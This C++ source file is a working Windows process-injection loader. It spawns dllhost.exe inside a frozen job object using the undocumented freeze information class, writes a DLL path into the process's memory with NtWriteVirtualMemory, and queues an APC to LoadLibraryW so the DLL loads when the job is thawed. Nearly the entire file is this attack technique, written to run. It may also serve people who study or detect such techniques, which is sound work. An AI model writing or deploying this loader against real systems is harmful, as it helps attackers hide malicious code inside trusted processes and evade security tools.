#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <winternl.h>
#include <iostream>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define JobObjectFreezeInformation 18

typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;

// Typedef NT-functions
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(HANDLE, PVOID*, PSIZE_T, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtCreateJobObject)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);
typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);

HMODULE hNtDll = GetModuleHandleA("ntdll.dll");

const char pAddress[] = "LoadLibraryW";

pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtDll, "NtQueueApcThread");
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)GetProcAddress(hNtDll, "NtAllocateVirtualMemoryEx");
pSetInformationJobObject NtSetInformationJobObject = (pSetInformationJobObject)GetProcAddress(hNtDll, "NtSetInformationJobObject");
pNtCreateJobObject NtCreateJobObject = (pNtCreateJobObject)GetProcAddress(hNtDll, "NtCreateJobObject");
pNtWaitForSingleObject NttWaitForSingleObject = (pNtWaitForSingleObject)GetProcAddress(hNtDll, "NtWaitForSingleObject");


// JOBOBJECT_FREEZE_INFORMATION
typedef struct _JOBOBJECT_WAKE_FILTER {
    ULONG HighEdgeFilter;
    ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

typedef struct _JOBOBJECT_FREEZE_INFORMATION {
    union {
        ULONG Flags;
        struct {
            ULONG FreezeOperation : 1;
            ULONG FilterOperation : 1;
            ULONG SwapOperation : 1;
            ULONG Reserved : 29;
        };
    };
    BOOLEAN Freeze;
    BOOLEAN Swap;
    UCHAR Reserved0[2];
    JOBOBJECT_WAKE_FILTER WakeFilter;
} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;

void SetColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

int main()
{
    
    const wchar_t dllPath[] = L"C:\\Users\\sample.dll";
    SIZE_T dllPathLen = sizeof(dllPath);
    SIZE_T regionSize = dllPathLen;

    HANDLE hJob = NULL;

    NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
    if (!NT_SUCCESS(creationJob)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", creationJob);
        CloseHandle(hJob);
        return -1;
    }


    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Initiate freeze
    freezeInfo.Freeze = TRUE;

    NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
    if (!NT_SUCCESS(freezeStatus)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", freezeStatus);
        CloseHandle(hJob);
        return -1;
    }


    STARTUPINFOEXW siEx = { 0 };
    siEx.StartupInfo.cb = sizeof(siEx);
    SIZE_T attrListSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!siEx.lpAttributeList) {
        printf("Error in the attribute list allocation.\n");
        CloseHandle(hJob);
        return -1;
    }
    if (!InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrListSize)) {
        std::cerr << "Error initialising the attribute list. Error: " << GetLastError() << std::endl;
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }
    // Enter the job object in the attribute list
    if (!UpdateProcThreadAttribute(
        siEx.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_JOB_LIST,
        &hJob,
        sizeof(HANDLE),
        NULL,
        NULL))
    {
        std::cerr << "Error updating the attribute list. Error: " << GetLastError() << std::endl;
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }

    // Create process in the job (e.g. dllhost.exe)
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(
        L"C:\\Windows\\System32\\dllhost.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &siEx.StartupInfo,
        &pi))
    {
        std::cerr << "CreateProcessW failed: " << GetLastError() << std::endl;
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hJob);
        return -1;
    }
    std::cout << "[+] Started Process in Job! PID: " << pi.dwProcessId << std::endl;

  

    // Release attribute list
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);

    PVOID remoteMemory = NULL;

    // Allocate memory in the target process | PAGE_READWRITE is sufficient for the DLL path
    NTSTATUS allocStatus = NtAllocateVirtualMemoryEx(pi.hProcess, &remoteMemory, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, NULL, 0);
    if (NT_SUCCESS(allocStatus)) {
        SetColor(FOREGROUND_GREEN);
        printf("[+] NtAllocateVirtualMemoryEx allocated memory at 0x%p\n", remoteMemory);
    }
    else {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", allocStatus);
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }


    // Write the DLL path to the allocated memory
    NTSTATUS writeStatus = NtWriteVirtualMemory(pi.hProcess, remoteMemory, (PVOID)dllPath, dllPathLen, NULL);
    if (NT_SUCCESS(writeStatus)) {
        SetColor(FOREGROUND_GREEN);
        printf("[+] DLL path was written to 0x%p\n", remoteMemory);
    }
    else {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", writeStatus);
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }


    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (hKernel32 == NULL) {
        SetColor(FOREGROUND_RED);
        printf("[-] Error retrieving Kernel32-Module\n");
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }

    
    FARPROC loadLibAddr = GetProcAddress(hKernel32, pAddress);
    if (!loadLibAddr) {
        printf("Error retrieving the address of LoadLibraryW.\n");
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    if (!NT_SUCCESS(NtQueueApcThread(pi.hThread, (PVOID)loadLibAddr, remoteMemory, NULL, NULL))) {
        printf("NtQueueApcThread failed...\n");
        CloseHandle(hJob);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    SetColor(FOREGROUND_INTENSITY);
    printf("[+] APC has been successfully installed. The DLL is loaded during defrosting.\n");

    printf("Press enter for thawing...\n");
    getchar();


    
    freezeInfo.FreezeOperation = 1; // Unfreeze operation
    freezeInfo.Freeze = FALSE;


    NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
    if (!NT_SUCCESS(unfreezeStatus)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", unfreezeStatus);
        CloseHandle(hJob);
        return -1;
    }

    SetColor(FOREGROUND_BLUE);
    printf("Process thawed successfully!\n");

    NTSTATUS waitForSingleObjectStatus = NttWaitForSingleObject(pi.hProcess, TRUE, NULL);
    if (!NT_SUCCESS(waitForSingleObjectStatus)) {
        SetColor(FOREGROUND_RED);
        printf("Error: 0x%X\n", waitForSingleObjectStatus);
        return -1;
    }


    // WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

    CloseHandle(hJob);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
